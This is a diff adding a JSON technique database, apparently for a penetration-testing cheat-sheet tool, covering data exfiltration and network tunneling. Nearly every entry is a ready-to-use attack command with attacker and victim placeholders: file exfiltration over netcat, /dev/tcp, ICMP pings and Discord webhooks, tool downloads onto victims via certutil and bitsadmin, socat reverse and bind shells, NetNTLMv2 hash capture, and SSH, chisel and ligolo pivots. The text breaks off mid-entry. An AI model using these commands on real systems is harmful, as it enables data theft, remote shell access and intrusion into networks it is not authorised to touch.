@@ -1,0 +1,1671 @@
+{
+  "version": "1.0.0",
+  "generated_at": "2026-05-11T00:00:00+00:00",
+  "source_commit": "21547bf1",
+  "techniques": {
+    "base64-exfil": {
+      "name": "Base64 Transfer",
+      "full_name": "Base64 Encode/Decode File Transfer",
+      "description": "Encode files as base64 for copy-paste transfer over text channels. Works without any network service — just copy output and decode on the other side.",
+      "topic": "exfiltration",
+      "platform": "both",
+      "aliases": ["base64", "certutil encode"],
+      "commands": [
+        {
+          "name": "Encode file (Linux)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "base64 -w0 {FILE}",
+          "note": "Outputs single-line base64; copy and paste to attacker"
+        },
+        {
+          "name": "Decode file (Linux)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "base64 -d {FILE}",
+          "note": ""
+        },
+        {
+          "name": "Encode file (Windows certutil)",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "certutil -encode {FILE} {FILE}.b64",
+          "note": ""
+        },
+        {
+          "name": "Decode file (Windows certutil)",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "certutil -decode {FILE}.b64 {FILE}",
+          "note": ""
+        }
+      ],
+      "see_also": ["http-exfil", "nc-exfil"]
+    },
+    "http-exfil": {
+      "name": "HTTP Exfiltration",
+      "full_name": "HTTP/HTTPS File Download and Upload",
+      "description": "Transfer files over HTTP using common system tools. Linux uses wget/curl; Windows uses certutil, bitsadmin, or PowerShell's WebClient/Invoke-WebRequest.",
+      "topic": "exfiltration",
+      "platform": "both",
+      "aliases": ["wget", "curl", "certutil urlcache", "invoke-webrequest", "bitsadmin"],
+      "commands": [
+        {
+          "name": "Download via wget (Linux)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "wget {LHOST}:{LPORT}/{FILE} -O /dev/shm/{FILE}",
+          "note": ""
+        },
+        {
+          "name": "Download via curl (Linux)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "curl {LHOST}:{LPORT}/{FILE} -o /tmp/{FILE}",
+          "note": ""
+        },
+        {
+          "name": "Download via certutil (Windows)",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "certutil -urlcache -split -f http://{LHOST}/{FILE} {FILE}",
+          "note": ""
+        },
+        {
+          "name": "Download via bitsadmin (Windows)",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "bitsadmin /transfer transfName /priority high http://{LHOST}/{FILE} C:\\Windows\\Temp\\{FILE}",
+          "note": ""
+        },
+        {
+          "name": "Download via PowerShell WebClient",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "(New-Object Net.WebClient).DownloadFile(\"http://{LHOST}/{FILE}\",\"C:\\Windows\\Temp\\{FILE}\")",
+          "note": ""
+        },
+        {
+          "name": "Download via Invoke-WebRequest (PowerShell)",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "Invoke-WebRequest \"http://{LHOST}/{FILE}\" -OutFile \"{FILE}\"",
+          "note": ""
+        },
+        {
+          "name": "Download via BITS (PowerShell)",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "Import-Module BitsTransfer\nStart-BitsTransfer -Source http://{LHOST}/{FILE} -Destination {FILE}",
+          "note": ""
+        },
+        {
+          "name": "Upload file via curl multipart",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "curl -X POST http://{LHOST}/upload -F 'files=@{FILE}'",
+          "note": "Requires an upload server listening; see http-server technique"
+        }
+      ],
+      "see_also": ["http-server", "base64-exfil", "ftp-exfil"]
+    },
+    "http-server": {
+      "name": "HTTP Server",
+      "full_name": "Quick HTTP File Server for Transfer",
+      "description": "Spin up a temporary HTTP server on the attacker machine to serve files to targets. Python3, goshs, and uploadserver cover download-only and bidirectional upload scenarios.",
+      "topic": "exfiltration",
+      "platform": "linux",
+      "aliases": ["python http.server", "goshs", "uploadserver", "SimpleHTTPServer"],
+      "commands": [
+        {
+          "name": "Python3 simple server",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "python3 -m http.server {PORT}",
+          "note": "Serves current directory; download-only"
+        },
+        {
+          "name": "Python3 upload server",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "pip3 install uploadserver && python3 -m uploadserver",
+          "note": "Accepts file uploads via POST to /upload"
+        },
+        {
+          "name": "goshs (full-featured)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "goshs",
+          "note": "Single binary; supports upload, HTTPS, auth, SMB, DNS/SMTP callbacks"
+        },
+        {
+          "name": "goshs with basic auth",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "goshs -b {USER}:{PASS}",
+          "note": ""
+        },
+        {
+          "name": "goshs upload-only mode",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "goshs -uo",
+          "note": ""
+        },
+        {
+          "name": "goshs HTTPS (self-signed)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "goshs -s -ss",
+          "note": ""
+        },
+        {
+          "name": "goshs SMB + NTLM hash capture",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "goshs -smb -smb-domain CORP",
+          "note": "Captures NetNTLMv2 hashes from connecting Windows clients"
+        },
+        {
+          "name": "goshs DNS callback server",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "goshs -dns -dns-ip {IP}",
+          "note": "Listens for OOB DNS callbacks"
+        },
+        {
+          "name": "goshs public tunnel",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "goshs -tunnel",
+          "note": "Exposes server via localhost.run — no port forwarding needed"
+        }
+      ],
+      "see_also": ["http-exfil", "ngrok", "smb-exfil"]
+    },
+    "webhook-exfil": {
+      "name": "Webhook Exfil",
+      "full_name": "Discord/Slack Webhook Exfiltration",
+      "description": "Abuse write-only HTTPS webhook endpoints (Discord, Slack, Teams) to beacon and exfiltrate files. These domains are rarely blocked and require no authentication setup.",
+      "topic": "exfiltration",
+      "platform": "windows",
+      "aliases": ["discord exfil", "slack exfil", "teams webhook"],
+      "commands": [
+        {
+          "name": "Send text beacon (Discord PS)",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "$webhook = \"https://discord.com/api/webhooks/{WEBHOOK_ID}/{WEBHOOK_TOKEN}\"\n$payload = @{ content = \"beacon: $env:USERNAME @ $env:COMPUTERNAME\" } | ConvertTo-Json -Compress\n$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, \"application/json\")\n$mp = New-Object System.Net.Http.MultipartFormDataContent\n$mp.Add($jsonContent, \"payload_json\")\n([System.Net.Http.HttpClient]::new()).PostAsync($webhook, $mp).Wait()",
+          "note": "HTTP 204 confirms delivery"
+        },
+        {
+          "name": "Upload file to Discord webhook",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "$webhook = \"https://discord.com/api/webhooks/{WEBHOOK_ID}/{WEBHOOK_TOKEN}\"\n$bytes = [System.IO.File]::ReadAllBytes(\"{FILE}\")\n$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)\n$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse(\"application/octet-stream\")\n$json = @{ content = \"exfil\" } | ConvertTo-Json -Compress\n$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, \"application/json\")\n$mp = New-Object System.Net.Http.MultipartFormDataContent\n$mp.Add($jsonContent, \"payload_json\")\n$mp.Add($fileContent, \"file\", \"{FILE}\")\n([System.Net.Http.HttpClient]::new()).PostAsync($webhook, $mp).Wait()",
+          "note": "Sends file as multipart attachment; max 8MB on free Discord"
+        }
+      ],
+      "see_also": ["http-exfil", "smtp-exfil"]
+    },
+    "ftp-exfil": {
+      "name": "FTP Transfer",
+      "full_name": "FTP Server Setup and File Transfer",
+      "description": "Stand up a quick FTP server on the attacker machine and pull files from Windows targets using the built-in FTP client (works without PowerShell).",
+      "topic": "exfiltration",
+      "platform": "both",
+      "aliases": ["pyftpdlib", "ftp-srv"],
+      "commands": [
+        {
+          "name": "FTP server via Python",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "pip3 install pyftpdlib && python3 -m pyftpdlib -p 21",
+          "note": "Anonymous access by default"
+        },
+        {
+          "name": "FTP server via NodeJS",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "sudo npm install -g ftp-srv --save && ftp-srv ftp://0.0.0.0:9876 --root /tmp",
+          "note": ""
+        },
+        {
+          "name": "Windows FTP client (no-interactive)",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "echo open {LHOST} 21 > ftp.txt\necho USER anonymous >> ftp.txt\necho anonymous >> ftp.txt\necho bin >> ftp.txt\necho GET {FILE} >> ftp.txt\necho bye >> ftp.txt\nftp -n -v -s:ftp.txt",
+          "note": "Bypasses interactive FTP prompt; works on old Windows without PowerShell"
+        }
+      ],
+      "see_also": ["http-exfil", "smb-exfil"]
+    },
+    "smb-exfil": {
+      "name": "SMB Transfer",
+      "full_name": "SMB Share File Transfer",
+      "description": "Share files over SMB using impacket-smbserver (attacker side). Useful for pushing tools to Windows targets or pulling loot without touching disk on the attacker.",
+      "topic": "exfiltration",
+      "platform": "both",
+      "aliases": ["impacket-smbserver", "smbserver", "net use"],
+      "commands": [
+        {
+          "name": "SMB server (impacket, no auth)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "impacket-smbserver -smb2support kali $(pwd)",
+          "note": "Shares current directory as 'kali'"
+        },
+        {
+          "name": "SMB server (impacket, with auth)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "impacket-smbserver -smb2support -user {USER} -password {PASS} kali $(pwd)",
+          "note": "Required for newer Windows 10/11 that reject guest SMB"
+        },
+        {
+          "name": "Execute from SMB share (Windows)",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "\\\\{LHOST}\\kali\\{FILE}",
+          "note": "Run tool directly from share without writing to disk"
+        },
+        {
+          "name": "Map SMB drive (Windows)",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "net use z: \\\\{LHOST}\\kali /user:{USER} {PASS}",
+          "note": ""
+        },
+        {
+          "name": "Map SMB drive (PowerShell)",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "New-PSDrive -Name \"share\" -PSProvider \"FileSystem\" -Root \"\\\\{LHOST}\\kali\"",
+          "note": ""
+        }
+      ],
+      "see_also": ["http-exfil", "ftp-exfil", "nc-exfil"]
+    },
+    "nc-exfil": {
+      "name": "Netcat Transfer",
+      "full_name": "Netcat and /dev/tcp File Transfer",
+      "description": "Transfer files using netcat or bash's built-in /dev/tcp pseudo-device. No tools needed beyond nc or bash itself.",
+      "topic": "exfiltration",
+      "platform": "linux",
+      "aliases": ["nc", "netcat", "/dev/tcp"],
+      "commands": [
+        {
+          "name": "Receive file (attacker)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "nc -lvnp {LPORT} > {FILE}",
+          "note": "Ctrl+C when transfer complete"
+        },
+        {
+          "name": "Send file (victim)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "nc -vn {LHOST} {LPORT} < {FILE}",
+          "note": ""
+        },
+        {
+          "name": "Send via /dev/tcp (victim, no nc)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "cat {FILE} > /dev/tcp/{LHOST}/{LPORT}",
+          "note": "Requires bash; no nc needed on victim"
+        },
+        {
+          "name": "Receive via /dev/tcp (attacker)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "nc -lvnp {LPORT} > {FILE}",
+          "note": ""
+        },
+        {
+          "name": "Push file to victim via /dev/tcp",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "# Attacker\nnc -w5 -lvnp {LPORT} < {FILE}\n# Victim\nexec 6< /dev/tcp/{LHOST}/{LPORT}\ncat <&6 > {FILE}",
+          "note": ""
+        }
+      ],
+      "see_also": ["http-exfil", "scp-exfil"]
+    },
+    "scp-exfil": {
+      "name": "SCP / SSHFS Transfer",
+      "full_name": "SCP and SSHFS File Transfer over SSH",
+      "description": "Transfer files or mount remote filesystems using SCP or SSHFS when SSH access is available.",
+      "topic": "exfiltration",
+      "platform": "linux",
+      "aliases": ["scp", "sshfs"],
+      "commands": [
+        {
+          "name": "SCP pull from victim",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "scp {USER}@{IP}:{FILE} .",
+          "note": "Attacker must have SSH access to victim"
+        },
+        {
+          "name": "SSHFS mount victim directory",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "sudo apt-get install sshfs\nsudo mkdir /mnt/sshfs\nsudo sshfs -o allow_other,default_permissions {USER}@{IP}:{REMOTE_PATH}/ /mnt/sshfs/",
+          "note": "Mounts victim filesystem locally for easy browsing"
+        }
+      ],
+      "see_also": ["nc-exfil", "ssh-tunnel"]
+    },
+    "icmp-exfil": {
+      "name": "ICMP Exfiltration",
+      "full_name": "Data Exfiltration via ICMP Ping",
+      "description": "Exfiltrate file data encoded in ICMP echo request payloads. Useful when only ICMP traffic is allowed outbound.",
+      "topic": "exfiltration",
+      "platform": "linux",
+      "aliases": ["ping exfil", "icmp tunnel exfil"],
+      "commands": [
+        {
+          "name": "Exfil file via pings (sender)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "xxd -p -c 4 {FILE} | while read line; do ping -c 1 -p $line {LHOST}; done",
+          "note": "4 bytes per ping packet; slow but bypasses many firewalls"
+        },
+        {
+          "name": "Receive ICMP data (scapy)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "python3 -c \"\nfrom scapy.all import *\ndef process_packet(pkt):\n    if pkt.haslayer(ICMP):\n        if pkt[ICMP].type == 0:\n            data = pkt[ICMP].load[-4:]\n            print(data.decode('utf-8'), flush=True, end='')\nsniff(iface='tun0', prn=process_packet)\n\"",
+          "note": "Run on attacker with tun0 or the right interface"
+        }
+      ],
+      "see_also": ["icmp-tunnel", "dns-tunnel"]
+    },
+    "smtp-exfil": {
+      "name": "SMTP Exfiltration",
+      "full_name": "Data Exfiltration via SMTP",
+      "description": "Use an SMTP server to receive exfiltrated data. Python's smtpd or goshs can act as a catch-all SMTP listener.",
+      "topic": "exfiltration",
+      "platform": "linux",
+      "aliases": ["email exfil", "smtpd"],
+      "commands": [
+        {
+          "name": "Python SMTP debugging server",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "sudo python3 -m smtpd -n -c DebuggingServer :25",
+          "note": "Prints all received email to stdout"
+        },
+        {
+          "name": "goshs SMTP callback server",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "goshs -smtp -smtp-domain {DOMAIN}",
+          "note": ""
+        },
+        {
+          "name": "goshs DNS + SMTP combined",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "goshs -dns -dns-ip {IP} -smtp -smtp-domain {DOMAIN}",
+          "note": "Full OOB callback coverage"
+        }
+      ],
+      "see_also": ["webhook-exfil", "dns-tunnel"]
+    },
+    "tftp-exfil": {
+      "name": "TFTP Transfer",
+      "full_name": "TFTP File Transfer",
+      "description": "TFTP is available by default on older Windows (XP/2003). Useful for pulling tools onto old Windows without PowerShell or certutil.",
+      "topic": "exfiltration",
+      "platform": "both",
+      "aliases": ["tftp", "ptftpd", "atftpd"],
+      "commands": [
+        {
+          "name": "TFTP server (Python)",
+          "platform": "linux",
+          "category": "exfiltration",
+          "command": "pip install ptftpd && ptftpd -p 69 tap0 .",
+          "note": "Replace tap0 with your interface name"
+        },
+        {
+          "name": "TFTP pull from Windows target",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "tftp -i {LHOST} get {FILE}",
+          "note": "Built-in on XP/2003; requires TFTP server on attacker"
+        }
+      ],
+      "see_also": ["ftp-exfil", "http-exfil"]
+    },
+    "vbscript-downloader": {
+      "name": "VBScript Downloader",
+      "full_name": "VBScript wget.vbs File Downloader",
+      "description": "Download files on old Windows using a VBScript-based wget substitute — works on systems without PowerShell or certutil.",
+      "topic": "exfiltration",
+      "platform": "windows",
+      "aliases": ["wget.vbs", "wscript downloader"],
+      "commands": [
+        {
+          "name": "Create wget.vbs downloader",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "echo strUrl = WScript.Arguments.Item(0) > wget.vbs\necho StrFile = WScript.Arguments.Item(1) >> wget.vbs\necho Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs\necho Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> wget.vbs\necho http.Open \"GET\", strURL, False >> wget.vbs\necho http.Send >> wget.vbs\necho varByteArray = http.ResponseBody >> wget.vbs\necho Set fs = CreateObject(\"Scripting.FileSystemObject\") >> wget.vbs\necho Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs\necho For lngCounter = 0 to UBound(varByteArray) >> wget.vbs\necho ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs\necho Next >> wget.vbs\necho ts.Close >> wget.vbs",
+          "note": "Creates wget.vbs in current directory"
+        },
+        {
+          "name": "Use wget.vbs to download file",
+          "platform": "windows",
+          "category": "exfiltration",
+          "command": "cscript wget.vbs http://{LHOST}/{FILE} {FILE}",
+          "note": ""
+        }
+      ],
+      "see_also": ["http-exfil", "base64-exfil"]
+    },
+    "bash-tunnel": {
+      "name": "Bash Pipe Tunnel",
+      "full_name": "Bash/Netcat Pipe-based Tunneling",
+      "description": "Chain nc or /dev/tcp to route traffic through a jump host without installing any additional tools.",
+      "topic": "tunneling",
+      "platform": "linux",
+      "aliases": ["nc pipe", "mkfifo tunnel", "bash pivot"],
+      "commands": [
+        {
+          "name": "NC pipe relay on jump host",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "mknod backpipe p\nnc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe",
+          "note": "On jump: connects port 3333 to 5985. Then connect target to jump:3333 and attacker to jump:5985"
+        },
+        {
+          "name": "/dev/tcp multi-hop relay",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "# On InternalA (has access to jump and internalB)\nexec 3<>/dev/tcp/{INTERNAL_B}/{PORT}\nexec 4<>/dev/tcp/{JUMP}/{PORT2}\ncat <&3 >&4 &\ncat <&4 >&3 &",
+          "note": "Pure bash; no nc needed"
+        }
+      ],
+      "see_also": ["ssh-tunnel", "socat-tunnel", "nc-exfil"]
+    },
+    "ssh-tunnel": {
+      "name": "SSH Tunnel",
+      "full_name": "SSH Local/Remote/Dynamic Port Forwarding",
+      "description": "Use SSH's built-in port forwarding to pivot through a compromised SSH host — local (-L), remote (-R), dynamic SOCKS (-D), or a full VPN tunnel.",
+      "topic": "tunneling",
+      "platform": "linux",
+      "aliases": ["ssh -L", "ssh -R", "ssh -D", "ssh socks", "ssh vpn", "ssh port forward"],
+      "commands": [
+        {
+          "name": "Local port forward (-L)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "ssh -i {SSH_KEY} {USER}@{IP} -L {LPORT}:{TARGET_IP}:{TARGET_PORT} -N -f",
+          "note": "Forwards local LPORT through the SSH server to TARGET_IP:TARGET_PORT"
+        },
+        {
+          "name": "Remote port forward (-R)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "ssh -R 0.0.0.0:{LPORT}:127.0.0.1:{PORT} {USER}@{IP}",
+          "note": "Exposes local PORT on the remote SSH server's LPORT"
+        },
+        {
+          "name": "Dynamic SOCKS proxy (-D)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "ssh -f -N -D {LPORT} {USER}@{IP}",
+          "note": "Creates SOCKS5 proxy on LPORT; use with proxychains"
+        },
+        {
+          "name": "Reverse port forward through DMZ",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "ssh -i dmz_key -R {DMZ_IP}:443:0.0.0.0:7000 root@{IP} -vN",
+          "note": "Catch rev shell on localhost:7000 by sending it to DMZ_IP:443; needs GatewayPorts yes in sshd_config"
+        },
+        {
+          "name": "SSH VPN tunnel (tun interface)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "ssh root@{IP} -w any:any\nip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0\nip link set tun0 up\n# Server side:\nip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0\nip link set tun0 up\necho 1 > /proc/sys/net/ipv4/ip_forward\niptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE",
+          "note": "Needs root both sides and PermitTunnel yes in sshd_config"
+        },
+        {
+          "name": "X forwarding (graphical)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "ssh -Y -C {USER}@{IP}",
+          "note": "-Y is faster than -X but less secure"
+        }
+      ],
+      "see_also": ["sshuttle", "chisel", "bash-tunnel"]
+    },
+    "sshuttle": {
+      "name": "sshuttle",
+      "full_name": "sshuttle Transparent Proxy over SSH",
+      "description": "Transparently route a subnet's traffic through an SSH server without needing root or special config on the server. Works like a VPN for TCP.",
+      "topic": "tunneling",
+      "platform": "linux",
+      "aliases": ["sshuttle vpn"],
+      "commands": [
+        {
+          "name": "Tunnel subnet via SSH",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "pip install sshuttle && sshuttle -r {USER}@{IP} {SUBNET}/24",
+          "note": "All TCP traffic to SUBNET is transparently routed through IP"
+        },
+        {
+          "name": "sshuttle with private key",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "sshuttle -D -r {USER}@{IP} 0/0 --ssh-cmd 'ssh -i ./id_rsa'",
+          "note": "-D runs as daemon; 0/0 routes all traffic"
+        }
+      ],
+      "see_also": ["ssh-tunnel", "chisel"]
+    },
+    "chisel": {
+      "name": "Chisel",
+      "full_name": "Chisel TCP/UDP Tunnel over HTTP",
+      "description": "Fast reverse tunnel over HTTP(S) — useful when only HTTP egress is allowed. Run a server on the attacker, a client on the victim; supports SOCKS5 and port forwarding.",
+      "topic": "tunneling",
+      "platform": "both",
+      "aliases": ["chisel socks", "chisel proxy"],
+      "commands": [
+        {
+          "name": "SOCKS proxy (attacker server, victim client)",
+          "platform": "both",
+          "category": "tunneling",
+          "command": "# Attacker\n./chisel server -p 8080 --reverse\n# Victim\n./chisel client {LHOST}:8080 R:socks",
+          "note": "Creates SOCKS5 proxy on attacker port 1080 (default); use with proxychains"
+        },
+        {
+          "name": "SOCKS proxy (victim server)",
+          "platform": "both",
+          "category": "tunneling",
+          "command": "# Victim (port 8080 must be reachable from attacker)\n./chisel server -v -p 8080 --socks5\n# Attacker\n./chisel client -v {IP}:8080 socks",
+          "note": ""
+        },
+        {
+          "name": "Port forwarding (reverse)",
+          "platform": "both",
+          "category": "tunneling",
+          "command": "# Attacker\n./chisel server -p 12312 --reverse\n# Victim\n./chisel client {LHOST}:12312 R:{LPORT}:127.0.0.1:{PORT}",
+          "note": "Exposes victim's local PORT on attacker's LPORT"
+        }
+      ],
+      "see_also": ["ssh-tunnel", "ligolo-ng", "frp"]
+    },
+    "ligolo-ng": {
+      "name": "Ligolo-ng",
+      "full_name": "Ligolo-ng Reverse Tunnel with TLS",
+      "description": "Agent/proxy tunnel tool that creates a proper tun interface on the attacker, allowing native routing to internal networks without proxychains.",
+      "topic": "tunneling",
+      "platform": "both",
+      "aliases": ["ligolo"],
+      "commands": [
+        {
+          "name": "Start proxy (attacker)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "sudo ./proxy -selfcert\ninterface_create --name \"ligolo\"\ncertificate_fingerprint",
+          "note": "Note the fingerprint to give to the agent"
+        },
+        {
+          "name": "Start agent (victim)",
+          "platform": "both",
+          "category": "tunneling",
+          "command": "./agent -connect {LHOST}:11601 -v -accept-fingerprint {FINGERPRINT}",
+          "note": ""
+        },
+        {
+          "name": "Start tunnel (attacker)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "session\n1\ntunnel_start --tun \"ligolo\"\nifconfig\ninterface_add_route --name \"ligolo\" --route {SUBNET}/{MASK}",
+          "note": "Run in the proxy interactive shell"
+        },
+        {
+          "name": "Listener on agent (reverse exposure)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "listener_add --addr 0.0.0.0:{PORT} --to 127.0.0.1:{LPORT} --tcp",
+          "note": "Opens PORT on victim and forwards to attacker's LPORT"
+        }
+      ],
+      "see_also": ["chisel", "ssh-tunnel"]
+    },
+    "socat-tunnel": {
+      "name": "Socat",
+      "full_name": "Socat Relay and Tunnel",
+      "description": "Versatile relay tool for port forwarding, bind/reverse shells, and SSL-wrapped tunnels. Available as a static binary on many platforms.",
+      "topic": "tunneling",
+      "platform": "both",
+      "aliases": ["socat relay", "socat port forward"],
+      "commands": [
+        {
+          "name": "Port-to-port relay",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "socat TCP4-LISTEN:{LPORT},fork TCP4:{TARGET_IP}:{TARGET_PORT} &",
+          "note": ""
+        },
+        {
+          "name": "Bind shell (victim)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "# Victim\nsocat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane\n# Attacker\nsocat FILE:`tty`,raw,echo=0 TCP4:{IP}:1337",
+          "note": "Full PTY bind shell"
+        },
+        {
+          "name": "Reverse shell",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "# Attacker\nsocat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0\n# Victim\nsocat TCP4:{LHOST}:1337 EXEC:bash,pty,stderr,setsid,sigint,sane",
+          "note": "Full PTY reverse shell"
+        },
+        {
+          "name": "Port relay through SOCKS",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "socat TCP4-LISTEN:{LPORT},fork SOCKS4A:127.0.0.1:{TARGET_HOST}:{TARGET_PORT},socksport=5678",
+          "note": ""
+        },
+        {
+          "name": "Remote port relay (persistent)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "# Attacker\nsudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr\n# Victim\nwhile true; do socat TCP4:{LHOST}:443 TCP4:127.0.0.1:22 ; done\n# Then SSH\nssh localhost -p 2222 -l {USER}",
+          "note": "Routes SSH through victim's outbound connection on port 443"
+        }
+      ],
+      "see_also": ["ssh-tunnel", "chisel", "bash-tunnel"]
+    },
+    "rpivot": {
+      "name": "Rpivot",
+      "full_name": "Rpivot Reverse SOCKS4 Tunnel",
+      "description": "Python-based reverse SOCKS4 tunnel — the victim initiates the connection to the attacker's server. Supports pivoting through NTLM-authenticated proxies.",
+      "topic": "tunneling",
+      "platform": "linux",
+      "aliases": ["rpivot socks"],
+      "commands": [
+        {
+          "name": "Rpivot server (attacker)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080",
+          "note": "SOCKS4 proxy available on 127.0.0.1:1080"
+        },
+        {
+          "name": "Rpivot client (victim)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "python client.py --server-ip {LHOST} --server-port 9999",
+          "note": ""
+        },
+        {
+          "name": "Rpivot via NTLM proxy (victim)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "python client.py --server-ip {LHOST} --server-port 9999 --ntlm-proxy-ip {PROXY_IP} --ntlm-proxy-port 8080 --domain {DOMAIN} --username {USER} --password {PASS}",
+          "note": "Tunnels through corporate NTLM proxy"
+        }
+      ],
+      "see_also": ["chisel", "ssh-tunnel"]
+    },
+    "plink-tunnel": {
+      "name": "Plink Tunnel",
+      "full_name": "Plink.exe SSH Port Forwarding (Windows)",
+      "description": "PuTTY's console SSH client for Windows. Use it to set up reverse port forwards from a Windows victim back to the attacker when no Linux tools are available.",
+      "topic": "tunneling",
+      "platform": "windows",
+      "aliases": ["plink", "putty tunnel"],
+      "commands": [
+        {
+          "name": "Reverse port forward via plink",
+          "platform": "windows",
+          "category": "tunneling",
+          "command": "echo y | plink.exe -l {USER} -pw {PASS} -R {LPORT}:127.0.0.1:{PORT} {LHOST}",
+          "note": "Exposes victim's local PORT on attacker's LPORT via SSH"
+        }
+      ],
+      "see_also": ["ssh-tunnel", "netsh-portproxy"]
+    },
+    "netsh-portproxy": {
+      "name": "Netsh PortProxy",
+      "full_name": "Windows Netsh Interface Port Proxy",
+      "description": "Built-in Windows port forwarding via netsh. Requires local admin. Useful for pivoting when no external tools can be uploaded.",
+      "topic": "tunneling",
+      "platform": "windows",
+      "aliases": ["netsh portproxy", "windows port forward", "portproxy"],
+      "commands": [
+        {
+          "name": "Add port forward",
+          "platform": "windows",
+          "category": "tunneling",
+          "command": "netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport={LPORT} connectaddress={TARGET_IP} connectport={TARGET_PORT} protocol=tcp",
+          "note": "Requires local admin"
+        },
+        {
+          "name": "List port forwards",
+          "platform": "windows",
+          "category": "tunneling",
+          "command": "netsh interface portproxy show v4tov4",
+          "note": ""
+        },
+        {
+          "name": "Delete port forward",
+          "platform": "windows",
+          "category": "tunneling",
+          "command": "netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport={LPORT}",
+          "note": ""
+        }
+      ],
+      "see_also": ["plink-tunnel", "ssh-tunnel"]
+    },
+    "meterpreter-pivot": {
+      "name": "Meterpreter Pivot",
+      "full_name": "Meterpreter Port Forwarding and SOCKS Proxy",
+      "description": "Set up port forwards or a SOCKS proxy through an active Meterpreter session to reach internal networks.",
+      "topic": "tunneling",
+      "platform": "both",
+      "aliases": ["msf pivot", "metasploit pivot", "portfwd", "autoroute"],
+      "commands": [
+        {
+          "name": "Port forward via meterpreter",
+          "platform": "both",
+          "category": "tunneling",
+          "command": "portfwd add -l {LPORT} -p {TARGET_PORT} -r {TARGET_IP}",
+          "note": "Run inside a meterpreter session"
+        },
+        {
+          "name": "SOCKS proxy via autoroute",
+          "platform": "both",
+          "category": "tunneling",
